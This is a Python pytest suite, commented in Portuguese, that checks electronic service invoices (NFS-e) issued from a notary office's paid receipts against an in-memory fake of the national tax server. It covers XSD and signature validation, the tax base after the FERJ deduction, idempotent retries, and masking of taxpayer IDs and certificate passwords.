"""A NFS-e DOS EMOLUMENTOS — do recibo pago à nota, contra um emissor FALSO.

POR QUE ESTES TESTES (LG01, 19/10/2026)
    A nota vai ao fisco: valor errado é imposto errado, nota em dobro é nota
    a cancelar, e senha em rastro é certificado da serventia exposto. Cada
    teste abaixo prova uma dessas promessas sem abrir rede: o emissor é uma
    SEFIN FALSA, na memória, que faz o que a de verdade faz do lado de lá —
    descomprime a DPS, valida contra o leiaute (um XSD mínimo, escrito aqui,
    com os grupos que a casa manda), confere a assinatura com o certificado
    que vem dentro dela e devolve a chave. A conferência da assinatura é
    escrita de novo aqui, e não emprestada de `nfse_dps`: um teste que confere
    a assinatura com o mesmo código que a fez não prova nada.

    Os documentos são os fictícios do varredor anti-vazamento; o certificado
    A1 é gerado na hora, numa pasta temporária, e não existe fora do teste.
"""
from __future__ import annotations

import base64
import gzip
import hashlib
import json
import re
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest
from lxml import etree

RAIZ = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(RAIZ))
sys.path.insert(0, str(RAIZ / "tests"))

import nfse as NFSE  # noqa: E402
import nfse_dps as DPS  # noqa: E402
import nfse_provedor as PROV  # noqa: E402
from bd_nativo import banco  # noqa: E402
from conftest import cg_login  # noqa: E402

SENHA_DO_A1 = "senha-ficticia-do-a1"
PRESTADOR = "00000010000127"          # 00.000.010/0001-27, fictício
TOMADOR = "00000000272"               # 000.000.002-72, fictício
OUTRO_TOMADOR = "00000000353"         # 000.000.003-53, fictício
MUNICIPIO = "2100055"                 # sete dígitos; não é a serventia
NS = {"n": DPS.NS, "ds": DPS.NS_DS}

# --------------------------------------------------------------- o leiaute
#
# OS ESQUEMAS OFICIAIS DA VERSÃO 1.01 (NFSe-ESQUEMAS_XSD-v1.01-20260209,
# gov.br/nfse), em `tests/xsd_nfse/v1.01`, sem uma vírgula mudada no arquivo.
# Até 24/10/2026 havia aqui um XSD MÍNIMO escrito à mão, da versão 1.00 — e
# ele aceitava o pedido de cancelamento que o esquema oficial recusa (o `Id`
# com 62 caracteres e o `nPedRegEvento`): o teste aprovava o defeito porque
# conferia contra a ideia que o código tinha do leiaute, e não contra ele.
#
# A ÚNICA ADAPTAÇÃO É NA LEITURA: o XSD oficial escreve 53 padrões com `^` e
# `$` (`^0{0,4}\d{1,5}$`). Em XML Schema o padrão já casa a cadeia inteira, e
# o libxml lê `^` e `$` como letras — recusaria toda série «1». Eles saem só
# na cópia temporária que o teste carrega.
PASTA_DOS_XSD = RAIZ / "tests" / "xsd_nfse" / "v1.01"


def _esquemas() -> dict[str, etree.XMLSchema]:
    import tempfile
    with tempfile.TemporaryDirectory(prefix="cg_xsd_nfse_") as nome_da_pasta:
        pasta = Path(nome_da_pasta)
        for arquivo in PASTA_DOS_XSD.glob("*.xsd"):
            texto = arquivo.read_text(encoding="utf-8")
            texto = re.sub(r'(<xs:pattern value=")\^(.*?)\$(")', r"\1\2\3", texto)
            (pasta / arquivo.name).write_text(texto, encoding="utf-8")
        # O esquema carregado guarda tudo o que leu: a pasta pode sumir depois.
        return {nome: etree.XMLSchema(etree.parse(str(pasta / arquivo)))
                for nome, arquivo in (("dps", "DPS_v1.01.xsd"), ("nfse", "NFSe_v1.01.xsd"),
                                      ("evento", "pedRegEvento_v1.01.xsd"))}


ESQUEMAS = _esquemas()
LEIAUTE = ESQUEMAS["dps"]
LEIAUTE_DO_EVENTO = ESQUEMAS["evento"]


def _assinatura_confere(raiz) -> bool:
    """A conferência da Sefin, escrita aqui de novo (e não a de `nfse_dps`)."""
    from cryptography import x509
    from cryptography.exceptions import InvalidSignature
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.asymmetric import padding

    sig = raiz.find("ds:Signature", NS)
    if sig is None:
        return False
    alvo = raiz[0]
    ref = sig.find("ds:SignedInfo/ds:Reference", NS)
    if ref.get("URI") != "#" + alvo.get("Id"):
        return False
    resumo = hashlib.sha256(etree.tostring(alvo, method="c14n")).digest()
    if base64.b64decode(ref.findtext("ds:DigestValue", namespaces=NS)) != resumo:
        return False
    cert = x509.load_der_x509_certificate(base64.b64decode(
        sig.findtext("ds:KeyInfo/ds:X509Data/ds:X509Certificate", namespaces=NS)))
    try:
        cert.public_key().verify(
            base64.b64decode(sig.findtext("ds:SignatureValue", namespaces=NS)),
            etree.tostring(sig.find("ds:SignedInfo", NS), method="c14n"),
            padding.PKCS1v15(), hashes.SHA256())
    except InvalidSignature:
        return False
    return True


def _nfse_falsa(dps, chave: str, numero: int) -> bytes:
    """A NFS-e 1.01 que a Sefin devolveria em volta da DPS — sem a assinatura dela.

    Os valores do ISS e do IBS/CBS são os de uma nota de R$ 105,63 a 5%, com a
    alíquota-teste de 2026 (CBS 0,9% e IBS UF 0,1%). Ela passa no esquema
    oficial da NFS-e em tudo menos na `Signature`, que é da Sefin.
    """
    def sub(pai, nome, texto=None):
        el = etree.SubElement(pai, f"{{{DPS.NS}}}{nome}")
        if texto is not None:
            el.text = texto
        return el
    raiz = etree.Element(f"{{{DPS.NS}}}NFSe", nsmap={None: DPS.NS})
    raiz.set("versao", "1.01")
    inf = sub(raiz, "infNFSe")
    inf.set("Id", f"NFS{chave}")
    for nome, valor in (("xLocEmi", "Municipio Ficticio"), ("xLocPrestacao", "Municipio Ficticio"),
                        ("nNFSe", str(numero)), ("cLocIncid", MUNICIPIO),
                        ("xLocIncid", "Municipio Ficticio"),
                        ("xTribNac", "Serviços de registros públicos, cartorários e notariais."),
                        ("verAplic", "SefinFalsa_1.01"), ("ambGer", "2"), ("tpEmis", "1"),
                        ("procEmi", "1"), ("cStat", "100"),
                        ("dhProc", "2026-10-24T10:00:05-03:00"), ("nDFSe", str(numero))):
        sub(inf, nome, valor)
    emit = sub(inf, "emit")
    sub(emit, "CNPJ", PRESTADOR)
    sub(emit, "xNome", "SERVENTIA FICTICIA")
    end = sub(emit, "enderNac")
    for nome, valor in (("xLgr", "RUA FICTICIA"), ("nro", "1"), ("xBairro", "CENTRO"),
                        ("cMun", MUNICIPIO), ("UF", "MA"), ("CEP", "65000000")):
        sub(end, nome, valor)
    servico = dps.findtext("n:infDPS/n:valores/n:vServPrest/n:vServ", namespaces=NS)
    iss = f"{round(float(servico) * 5) / 100:.2f}"
    val = sub(inf, "valores")
    for nome, valor in (("vBC", servico), ("pAliqAplic", "5.00"), ("vISSQN", iss),
                        ("vTotalRet", "0.00"), ("vLiq", servico)):
        sub(val, nome, valor)
    if dps.find("n:infDPS/n:IBSCBS", NS) is not None:
        ib = sub(inf, "IBSCBS")
        sub(ib, "cLocalidadeIncid", MUNICIPIO)
        sub(ib, "xLocalidadeIncid", "Municipio Ficticio")
        v = sub(ib, "valores")
        sub(v, "vBC", servico)
        for grupo, campos in (("uf", (("pIBSUF", "0.10"), ("pAliqEfetUF", "0.10"))),
                              ("mun", (("pIBSMun", "0.00"), ("pAliqEfetMun", "0.00"))),
                              ("fed", (("pCBS", "0.90"), ("pAliqEfetCBS", "0.90")))):
            g = sub(v, grupo)
            for nome, valor in campos:
                sub(g, nome, valor)
        tot = sub(ib, "totCIBS")
        sub(tot, "vTotNF", f"{float(servico) + 0.12 + 1.08:.2f}")
        gibs = sub(tot, "gIBS")
        sub(gibs, "vIBSTot", "0.12")
        sub(sub(gibs, "gIBSUFTot"), "vIBSUF", "0.12")
        sub(sub(gibs, "gIBSMunTot"), "vIBSMun", "0.00")
        sub(sub(tot, "gCBS"), "vCBS", "1.08")
    inf.append(etree.fromstring(etree.tostring(dps)))
    return etree.tostring(raiz, xml_declaration=True, encoding="UTF-8")


class SefinFalsa:
    """O emissor nacional, na memória. Guarda o que recebeu; nunca abre rede."""

    def __init__(self):
        self.chamadas: list[tuple[str, str]] = []
        # id da DPS -> nota, um cadastro por ambiente: a produção restrita e a
        # produção são sistemas separados, e a mesma DPS nº 1 existe nos dois.
        self.por_ambiente: dict[bool, dict[str, dict]] = {True: {}, False: {}}
        self.emitidas = self.por_ambiente[True]    # o da homologação
        self._agora = self.emitidas
        self.canceladas: set[str] = set()
        self.recusar_com: str | None = None        # código de erro da próxima emissão
        self.perder_a_resposta = False             # emite, e a resposta não chega
        self.fora_do_ar = False
        self.aceita_producao = False               # só o teste da virada liga

    def __call__(self, metodo: str, url: str, corpo=None) -> PROV.Resposta:
        self.chamadas.append((metodo, url))
        homologacao = url.startswith(("https://sefin.producaorestrita.nfse.gov.br/",
                                      "https://adn.producaorestrita.nfse.gov.br/"))
        assert homologacao or self.aceita_producao, \
            "o teste fala com a homologação, e só com ela"
        self._agora = self.por_ambiente[homologacao]
        if self.fora_do_ar:
            raise TimeoutError("timed out")
        caminho = url.split(".gov.br", 1)[1]
        if metodo == "POST" and caminho.endswith("/SefinNacional/nfse"):
            return self._emitir(corpo)
        achado = re.match(r"/SefinNacional/dps/(DPS\d+)$", caminho)
        if metodo == "GET" and achado:
            nota = self._agora.get(achado.group(1))
            return (PROV.Resposta(200, {"chaveAcesso": nota["chave"]}) if nota
                    else PROV.Resposta(404, {}))
        achado = re.match(r"/SefinNacional/nfse/(\d{50})(/eventos)?$", caminho)
        if achado and metodo == "GET":
            nota = next(n for n in self._agora.values() if n["chave"] == achado.group(1))
            return PROV.Resposta(200, {"chaveAcesso": nota["chave"],
                                       "nfseXmlGZipB64": PROV.comprimir(nota["xml"])})
        if achado and metodo == "POST":
            return self._cancelar(achado.group(1), corpo)
        achado = re.match(r"/SefinNacional/parametros_municipais/(\d{7})/(\w+)$", caminho)
        if achado and metodo == "GET":
            return PROV.Resposta(200, {"municipio": achado.group(1),
                                       "consulta": achado.group(2), "ficticio": True})
        # O DANFSe do ADN foi suspenso em 1º/07/2026 (NT 008): a casa não
        # pode mais pedi-lo, e o servidor falso responde como se não existisse.
        return PROV.Resposta(404, {})

    def _emitir(self, corpo) -> PROV.Resposta:
        xml = gzip.decompress(base64.b64decode(corpo["dpsXmlGZipB64"]))
        raiz = etree.fromstring(xml)
        if not LEIAUTE.validate(raiz):
            return PROV.Resposta(400, {"erros": [{"Codigo": "E1235", "Descricao":
                                                  str(LEIAUTE.error_log.last_error)}]})
        if not _assinatura_confere(raiz):
            return PROV.Resposta(400, {"erros": [{"Codigo": "E0714",
                                                  "Descricao": "Assinatura inválida"}]})
        if self.recusar_com:
            codigo, self.recusar_com = self.recusar_com, None
            return PROV.Resposta(400, {"erros": [{"Codigo": codigo,
                                                  "Descricao": "Recusa de teste"}]})
        ident = raiz[0].get("Id")
        if ident in self._agora:
            return PROV.Resposta(400, {"erros": [{"Codigo": "E0014",
                                                  "Descricao": "DPS já convertida em NFS-e"}]})
        numero = len(self._agora) + 1
        tp_amb = raiz.findtext("n:infDPS/n:tpAmb", namespaces=NS)
        chave = f"{MUNICIPIO}{tp_amb}{numero:042d}"
        nfse = _nfse_falsa(raiz, chave, numero)
        self._agora[ident] = {"chave": chave, "numero": numero, "xml": nfse, "dps": raiz}
        if self.perder_a_resposta:
            self.perder_a_resposta = False
            raise TimeoutError("timed out")       # emitiu, e a resposta se perdeu
        return PROV.Resposta(201, {"chaveAcesso": chave,
                                   "nfseXmlGZipB64": PROV.comprimir(nfse)})

    def _cancelar(self, chave: str, corpo) -> PROV.Resposta:
        raiz = etree.fromstring(gzip.decompress(base64.b64decode(
            corpo["pedidoRegistroEventoXmlGZipB64"])))
        if not LEIAUTE_DO_EVENTO.validate(raiz):
            return PROV.Resposta(400, {"erros": [{"Codigo": "E1235", "Descricao":
                                                  str(LEIAUTE_DO_EVENTO.error_log.last_error)}]})
        if not _assinatura_confere(raiz):
            return PROV.Resposta(400, {"erros": [{"Codigo": "E0714",
                                                  "Descricao": "Assinatura inválida"}]})
        if raiz.findtext("n:infPedReg/n:chNFSe", namespaces=NS) != chave:
            return PROV.Resposta(400, {"erros": [{"Codigo": "E1800",
                                                  "Descricao": "Chave diferente"}]})
        self.canceladas.add(chave)
        return PROV.Resposta(201, {})

    def posts_de_dps(self) -> int:
        return sum(1 for m, u in self.chamadas if m == "POST" and u.endswith("/nfse"))


# ----------------------------------------------------------------- a casa

@pytest.fixture(scope="module")
def pfx() -> bytes:
    """Um A1 fictício, autoassinado — gerado uma vez por arquivo."""
    from cryptography import x509
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives.serialization import (BestAvailableEncryption,
                                                              pkcs12)
    from cryptography.x509.oid import NameOID

    chave = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    nome = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME,
                                         "SERVENTIA FICTICIA DE TESTE")])
    agora = datetime.now(timezone.utc)
    cert = (x509.CertificateBuilder().subject_name(nome).issuer_name(nome)
            .public_key(chave.public_key()).serial_number(x509.random_serial_number())
            .not_valid_before(agora - timedelta(days=1))
            .not_valid_after(agora + timedelta(days=365)).sign(chave, hashes.SHA256()))
    return pkcs12.serialize_key_and_certificates(
        b"a1", chave, cert, None, BestAvailableEncryption(SENHA_DO_A1.encode()))


@pytest.fixture
def sefin(monkeypatch) -> SefinFalsa:
    falsa = SefinFalsa()
    monkeypatch.setattr(PROV, "transporte_https", lambda certificado, prazo=30: falsa)
    return falsa


@pytest.fixture
def credenciais(tmp_path, monkeypatch) -> Path:
    """A pasta fora do banco (o `%PROGRAMDATA%` da máquina), aqui temporária."""
    monkeypatch.setenv("PROGRAMDATA", str(tmp_path))
    return tmp_path / "CartorioGestao"


CONFIG_LIGADA = {
    "nfse_ligada": "1", "nfse_ambiente": "homologacao", "nfse_provedor": "nacional",
    "nfse_municipio": MUNICIPIO, "nfse_prestador_documento": PRESTADOR,
    "nfse_inscricao_municipal": "12345", "nfse_codigo_tributacao": "210101",
    "nfse_aliquota": "5,00", "nfse_optante_simples": "1", "nfse_regime_especial": "4",
    "nfse_serie": "1", "nfse_exige_endereco": "1",
    "nfse_ibscbs_cst": "000", "nfse_ibscbs_classificacao": "000001",
}


@pytest.fixture
def casa(cg_casa_logada, sefin, credenciais, pfx):
    """Casa com NFS-e ligada na homologação, certificado gravado e Sefin falsa."""
    db = cg_casa_logada["db"]
    with db.transaction() as con:
        NFSE.gravar_configuracao(con, CONFIG_LIGADA)
    NFSE.gravar_certificado(pfx, SENHA_DO_A1)
    return {**cg_casa_logada, "sefin": sefin, "pfx": pfx}


def _recibo(db, *, numero: int, documento: str | None = TOMADOR,
            pagador: str = "TOMADORA FICTICIA DE TESTE", total: str = "134,43",
            lancamentos: list[dict] | None = None, data: str = "2026-10-19",
            discriminacao: dict | None = None) -> int:
    """Um recibo pago, com os lançamentos que o pagaram."""
    if lancamentos is None:
        lancamentos = [{"valor": "134,43", "emolumentos": "120,03", "ferc": "3,60",
                        "fadep": "4,80", "femp": "4,80", "ferrfis": "1,20"}]
    disc = discriminacao or {"itens": [{"codigo_ato": "16.3", "descricao":
                                        "Certidão de inteiro teor", "quantidade": 1}]}
    with db.transaction() as con:
        bd = banco(con)
        rid = bd.escrever(
            """INSERT INTO cx_recibos (numero, ano, data_emissao, pagador, pagador_documento,
                   valor_total, discriminacao, corpo, criado_em)
               VALUES (%s, 2026, %s, %s, %s, %s, %s, %s, %s) RETURNING id""",
            (numero, data, pagador, documento, total, json.dumps(disc),
             json.dumps(disc), data + "T10:00:00"))[0]["id"]
        for i, l in enumerate(lancamentos, start=1):
            bd.escrever(
                """INSERT INTO cx_lancamentos (data, natureza, sentido, valor, emolumentos,
                       ferc, fadep, femp, ferrfis, recibo_id, numero, ano, criado_em)
                   VALUES (%s, 'RECEBIMENTO', 'ENTRADA', %s, %s, %s, %s, %s, %s, %s,
                           %s, 2026, %s)""",
                (data, l["valor"], l.get("emolumentos"), l.get("ferc"), l.get("fadep"),
                 l.get("femp"), l.get("ferrfis"), rid, numero * 10 + i, data + "T10:00:00"))
    return int(rid)


def _endereco(db, documento: str = TOMADOR) -> None:
    with db.transaction() as con:
        banco(con).escrever(
            """INSERT INTO nfse_tomadores (documento, nome, cep, municipio, logradouro,
                   numero, bairro) VALUES (%s, '', '65000000', %s, 'RUA FICTICIA', '10',
                   'CENTRO')""", (documento, MUNICIPIO))


def _token(cliente) -> str:
    cliente.get("/caixa/nfse")
    with cliente.session_transaction() as s:
        return s["csrf_token"]


def _emitir(casa, recibo_id: int):
    c = casa["c"]
    return c.post(f"/caixa/nfse/recibo/{recibo_id}/emitir",
                  data={"csrf_token": _token(c)}, follow_redirects=True)


def _cfg(db) -> dict:
    with db.connect() as con:
        return NFSE.configuracao(con)


def _nota_do_recibo(db, recibo_id: int) -> dict:
    with db.connect() as con:
        notas = NFSE.notas_do_recibo(con, recibo_id)
    assert len(notas) == 1, notas
    return notas[0]


# ------------------------------------------------------------- o XML puro

def test_a_dps_assinada_passa_no_leiaute_e_na_assinatura_do_servidor_falso(pfx):
    cert = DPS.abrir_pfx(pfx, SENHA_DO_A1)
    xml = DPS.assinar(DPS.montar_dps(
        ambiente="homologacao", emitida_em=datetime(2026, 10, 19, 10, 0, tzinfo=timezone(
            timedelta(hours=-3))), serie="1", numero=7,
        prestador=DPS.Prestador(PRESTADOR, "12345", MUNICIPIO),
        tomador=DPS.Tomador(TOMADOR, "TOMADORA FICTICIA", "65000000", MUNICIPIO,
                            "RUA FICTICIA", "10", "", "CENTRO"),
        servico=DPS.Servico("210101", "Emolumentos", 12003, "5,00")), cert)
    raiz = etree.fromstring(xml)
    assert LEIAUTE.validate(raiz), LEIAUTE.error_log
    assert _assinatura_confere(raiz)
    assert raiz[0].get("Id") == f"DPS{MUNICIPIO}2{PRESTADOR}00001{7:015d}"
    assert raiz.findtext("n:infDPS/n:valores/n:vServPrest/n:vServ", namespaces=NS) == "120.03"
    assert raiz.findtext("n:infDPS/n:dhEmi", namespaces=NS) == "2026-10-19T10:00:00-03:00"


def test_dps_mexida_depois_de_assinada_e_recusada_pela_assinatura(pfx):
    cert = DPS.abrir_pfx(pfx, SENHA_DO_A1)
    xml = DPS.assinar(DPS.montar_dps(
        ambiente="homologacao", emitida_em=datetime.now().astimezone(), serie="1", numero=1,
        prestador=DPS.Prestador(PRESTADOR, "", MUNICIPIO),
        tomador=DPS.Tomador(TOMADOR, "TOMADORA FICTICIA"),
        servico=DPS.Servico("210101", "Emolumentos", 1000)), cert)
    mexido = xml.replace(b"<vServ>10.00</vServ>", b"<vServ>1.00</vServ>")
    assert mexido != xml
    assert DPS.conferir_assinatura(xml) and not DPS.conferir_assinatura(mexido)
    assert not _assinatura_confere(etree.fromstring(mexido))


def test_senha_errada_do_a1_nao_abre_e_a_frase_nao_traz_a_senha(pfx):
    with pytest.raises(DPS.DpsError) as erro:
        DPS.abrir_pfx(pfx, "senha-errada-qualquer")
    assert "senha-errada-qualquer" not in str(erro.value)


# ---------------------------------------------------- a base e a pendência

def test_a_base_e_o_emolumento_menos_o_ferj_e_os_fundos_ficam_fora_da_nota(casa):
    """No Maranhão, a base é o emolumento menos o FERJ de 12% (LC 48/2000, art. 3º, V);
    o FERC (3%) é cobrado por cima e NÃO se desconta (o oficial, 25/10/2026)."""
    db = casa["db"]
    rid = _recibo(db, numero=101)
    _endereco(db)
    resposta = _emitir(casa, rid)
    assert resposta.status_code == 200
    nota = _nota_do_recibo(db, rid)
    assert nota["situacao"] == NFSE.EMITIDA, nota["mensagem"]
    assert nota["valor_servico"] == 10563          # 120,03 − 14,40 (12% de FERJ); não os 134,43
    assert nota["valor_iss"] == 528                # 5% de 105,63 = 5,2815 → 5,28
    dps = casa["sefin"].emitidas[nota["id_dps"]]["dps"]
    assert dps.findtext("n:infDPS/n:valores/n:vServPrest/n:vServ", namespaces=NS) == "105.63"
    descricao = dps.findtext("n:infDPS/n:serv/n:cServ/n:xDescServ", namespaces=NS)
    assert "R$ 28,80" in descricao and "emolumento menos o FERJ" in descricao
    assert NFSE.ferj_do_emolumento(12003, 1200) == 1440   # e o FERC de 3,60 não entra
    assert "TOMADORA" not in descricao             # a descrição não leva o nome


def test_ferj_vazio_vale_12_por_cento_na_nota_como_no_livro():
    """Decisão do oficial em 27/10/2026: «12% para os dois». Até essa data a
    NFS-e lia a chave por conta própria e, vazia, dava 0% — a nota saía com a
    base cheia enquanto o Livro Diário descontava 12%. Agora a leitura é uma
    só: a de `custas`."""
    import custas
    for cfg in ({}, {"nfse_percentual_ferj": ""}, {"nfse_percentual_ferj": "  "},
                {"nfse_percentual_ferj": None}):
        assert NFSE.percentual_ferj(cfg) == 1200 == custas.percentual_ferj(cfg), cfg
    assert NFSE.percentual_ferj({"nfse_percentual_ferj": "10,5"}) == 1050
    with pytest.raises(NFSE.NfseError, match="Gestor → NFS-e"):
        NFSE.percentual_ferj({"nfse_percentual_ferj": "doze"})
    with pytest.raises(NFSE.NfseError, match="entre 0 e 100"):
        NFSE.percentual_ferj({"nfse_percentual_ferj": "100"})
    # E a configuração com o campo apagado é aceita — e vale 12,00.
    assert NFSE.percentual_ferj(NFSE.conferir_configuracao(
        {**NFSE.PADRAO, "nfse_percentual_ferj": ""})) == 1200


def test_ferj_vazio_gravado_desconta_12_por_cento_da_base(casa):
    db = casa["db"]
    rid = _recibo(db, numero=901)
    db.set_settings({"nfse_percentual_ferj": ""})
    with db.connect() as con:
        item = NFSE.avaliar_recibo(con, rid, _cfg(db))
    assert item["base"] == 10563          # 120,03 − 14,40, e não os 120,03 cheios


def test_ferj_ilegivel_gravado_fora_da_tela_vira_pendencia_e_nao_500(casa):
    """Até 27/10/2026 o valor ilegível levantava `NfseError` dentro de
    `avaliar`, e a fila e a ficha do recibo davam HTTP 500."""
    db, c = casa["db"], casa["c"]
    rid = _recibo(db, numero=902)
    _endereco(db)
    db.set_settings({"nfse_percentual_ferj": "doze"})
    cfg = _cfg(db)
    assert any("Percentual do FERJ ilegível" in f
               for f in NFSE.pendencias_da_configuracao(cfg))
    with db.connect() as con:
        item = NFSE.avaliar_recibo(con, rid, cfg)
    assert item["base"] is None and item["iss"] is None
    assert any("Gestor → NFS-e" in p for p in item["pendencias"])
    for rota in ("/caixa/nfse", f"/caixa/nfse/recibo/{rid}"):
        resposta = c.get(rota)
        assert resposta.status_code == 200, rota
        assert "Percentual do FERJ ilegível" in resposta.get_data(as_text=True), rota
    assert "Percentual do FERJ ilegível" in _emitir(casa, rid).get_data(as_text=True)
    assert casa["sefin"].chamadas == []


def test_recibo_sem_cpf_vira_pendencia_clara_e_nao_chama_o_emissor(casa):
    db = casa["db"]
    rid = _recibo(db, numero=102, documento=None)
    resposta = _emitir(casa, rid)
    assert "Falta o CPF ou CNPJ do tomador" in resposta.get_data(as_text=True)
    assert casa["sefin"].chamadas == []
    with db.connect() as con:
        assert NFSE.notas_do_recibo(con, rid) == []
        grupos = NFSE.fila(con, _cfg(db))
    assert [i["recibo"]["id"] for i in grupos["pendentes"]] == [rid]


def test_falta_de_endereco_e_pendencia_e_o_balcao_completa_sem_mexer_no_recibo(casa):
    db = casa["db"]
    rid = _recibo(db, numero=103)
    c = casa["c"]
    html = c.get(f"/caixa/nfse/recibo/{rid}").get_data(as_text=True)
    assert "Falta o endereço do tomador" in html
    resposta = c.post(f"/caixa/nfse/recibo/{rid}", data={
        "csrf_token": _token(c), "documento": TOMADOR, "nome": "",
        "cep": "65000-000", "municipio": MUNICIPIO, "logradouro": "RUA FICTICIA",
        "numero": "10", "bairro": "CENTRO"}, follow_redirects=True)
    assert "Dados do tomador gravados" in resposta.get_data(as_text=True)
    with db.connect() as con:
        item = NFSE.avaliar_recibo(con, rid, _cfg(db))
        r = NFSE.recibo(con, rid)
    assert item["pendencias"] == []
    assert r["pagador_documento"] == TOMADOR and r["pagador"] == "TOMADORA FICTICIA DE TESTE"
    # o endereço fica pelo CPF, e o próximo recibo da mesma pessoa já sai pronto
    outro = _recibo(db, numero=104)
    with db.connect() as con:
        assert NFSE.avaliar_recibo(con, outro, _cfg(db))["pendencias"] == []


def test_lancamento_que_nao_separa_emolumento_vira_pendencia_e_nao_palpite(casa):
    db = casa["db"]
    rid = _recibo(db, numero=105, total="50,00", lancamentos=[{"valor": "50,00"}])
    _endereco(db)
    with db.connect() as con:
        item = NFSE.avaliar_recibo(con, rid, _cfg(db))
    assert item["base"] == 0
    assert any("não separa o emolumento dos fundos" in p for p in item["pendencias"])
    _emitir(casa, rid)
    assert casa["sefin"].chamadas == []


def test_ato_gratuito_nao_tem_nota_nem_aparece_como_pendencia(casa):
    db = casa["db"]
    rid = _recibo(db, numero=106, total="0,00", lancamentos=[
        {"valor": "0,00", "emolumentos": "0,00", "ferc": "0,00"}])
    with db.connect() as con:
        grupos = NFSE.fila(con, _cfg(db))
    assert rid not in [i["recibo"]["id"] for g in grupos.values() for i in g]


# ------------------------------------------------- a nota e a idempotência

def test_emitir_deixa_rastro_em_audit_logs_e_a_homologacao_nao_marca_o_recibo(casa):
    db = casa["db"]
    rid = _recibo(db, numero=107)
    _endereco(db)
    html = _emitir(casa, rid).get_data(as_text=True)
    assert "NFS-e 1 emitida" in html
    nota = _nota_do_recibo(db, rid)
    with db.connect() as con:
        r = NFSE.recibo(con, rid)
        logs = banco(con).ler(
            "SELECT action, details FROM audit_logs WHERE action LIKE 'NFSE%' ORDER BY id")
    assert len(nota["chave"]) == 50
    # nota de homologação não tem valor fiscal: o recibo não a carrega
    assert (r["nfse_numero"], r["nfse_chave"]) == (None, None)
    assert [l["action"] for l in logs] == ["NFSE_EMITIDA"]
    assert TOMADOR not in logs[0]["details"]          # CPF vai mascarado
    assert "***.000.002-**" in logs[0]["details"]


def test_na_producao_o_numero_e_a_chave_vao_ao_recibo_e_a_nota_de_teste_nao_impede(casa):
    """A virada: o recibo testado na homologação ganha a nota de verdade."""
    db = casa["db"]
    rid = _recibo(db, numero=115)
    _endereco(db)
    _emitir(casa, rid)                                   # a de teste
    with db.transaction() as con:
        NFSE.gravar_configuracao(con, {**CONFIG_LIGADA, "nfse_ambiente": "producao"})
    casa["sefin"].aceita_producao = True
    _emitir(casa, rid)
    with db.connect() as con:
        notas = NFSE.notas_do_recibo(con, rid)
        r = NFSE.recibo(con, rid)
    assert [(n["ambiente"], n["situacao"]) for n in notas] == [
        ("homologacao", NFSE.EMITIDA), ("producao", NFSE.EMITIDA)]
    producao = notas[1]
    assert producao["numero_dps"] == 1                  # a numeração é por ambiente
    assert (r["nfse_numero"], r["nfse_chave"]) == (producao["numero_nfse"], producao["chave"])
    assert casa["sefin"].chamadas[-1][1].startswith("https://sefin.nfse.gov.br/")
    # e a DPS de teste que ficou para trás não vai à produção
    with pytest.raises(NFSE.NfseError, match="homologacao"):
        NFSE.cancelar(db, notas[0]["id"], provedor=NFSE.provedor_da_casa(
            _cfg(db), NFSE.ler_certificado()), certificado=NFSE.ler_certificado(),
            cfg=_cfg(db), motivo="1", justificativa="Teste da troca de ambiente",
            usuario="teste")


def test_clicar_duas_vezes_nao_emite_duas_notas(casa):
    db = casa["db"]
    rid = _recibo(db, numero=108)
    _endereco(db)
    _emitir(casa, rid)
    _emitir(casa, rid)
    assert casa["sefin"].posts_de_dps() == 1
    assert _nota_do_recibo(db, rid)["situacao"] == NFSE.EMITIDA


def test_rede_que_cai_deixa_na_fila_e_o_reenvio_recupera_a_mesma_nota(casa):
    """A Sefin emitiu e a resposta se perdeu: reenviar não pode criar a segunda."""
    db = casa["db"]
    rid = _recibo(db, numero=109)
    _endereco(db)
    casa["sefin"].perder_a_resposta = True
    html = _emitir(casa, rid).get_data(as_text=True)
    assert "ficou na fila" in html
    nota = _nota_do_recibo(db, rid)
    assert nota["situacao"] == NFSE.ENVIANDO and nota["tentativas"] == 1
    with db.connect() as con:
        assert [i["recibo"]["id"] for i in NFSE.fila(con, _cfg(db))["enviando"]] == [rid]
    c = casa["c"]
    c.post(f"/caixa/nfse/nota/{nota['id']}/reenviar", data={"csrf_token": _token(c)})
    depois = _nota_do_recibo(db, rid)
    assert depois["situacao"] == NFSE.EMITIDA
    assert depois["chave"] == casa["sefin"].emitidas[nota["id_dps"]]["chave"]
    assert casa["sefin"].posts_de_dps() == 1          # perguntou, não mandou de novo
    assert depois["xml_dps"] == nota["xml_dps"]       # a mesma DPS, byte a byte


def test_resposta_de_dps_ja_emitida_vira_a_chave_e_nao_recusa(casa, pfx):
    db = casa["db"]
    rid = _recibo(db, numero=110)
    _endereco(db)
    cfg = _cfg(db)
    cert = DPS.abrir_pfx(pfx, SENHA_DO_A1)
    with db.transaction() as con:
        nota = NFSE.preparar(con, rid, cfg=cfg, certificado=cert, usuario="teste")
    provedor = NFSE.provedor_da_casa(cfg, cert)
    provedor.emitir(nota["xml_dps"].encode("utf-8"))   # outra máquina mandou antes
    final = NFSE.enviar(db, nota["id"], provedor, usuario="teste")
    assert final["situacao"] == NFSE.EMITIDA
    assert final["chave"] == casa["sefin"].emitidas[nota["id_dps"]]["chave"]


def test_recusa_do_emissor_fica_na_fila_e_o_reenvio_reusa_o_numero_da_dps(casa):
    db = casa["db"]
    rid = _recibo(db, numero=111)
    _endereco(db)
    casa["sefin"].recusar_com = "E0312"
    html = _emitir(casa, rid).get_data(as_text=True)
    assert "recusou a DPS" in html and "E0312" in html
    recusada = _nota_do_recibo(db, rid)
    assert recusada["situacao"] == NFSE.REJEITADA
    c = casa["c"]
    c.post(f"/caixa/nfse/nota/{recusada['id']}/reenviar", data={"csrf_token": _token(c)})
    depois = _nota_do_recibo(db, rid)
    assert depois["situacao"] == NFSE.EMITIDA
    assert depois["numero_dps"] == recusada["numero_dps"]


def test_dois_recibos_pegam_numeros_de_dps_seguidos(casa):
    db = casa["db"]
    _endereco(db)
    a, b = _recibo(db, numero=112), _recibo(db, numero=113)
    _emitir(casa, a)
    _emitir(casa, b)
    assert (_nota_do_recibo(db, a)["numero_dps"], _nota_do_recibo(db, b)["numero_dps"]) == (1, 2)


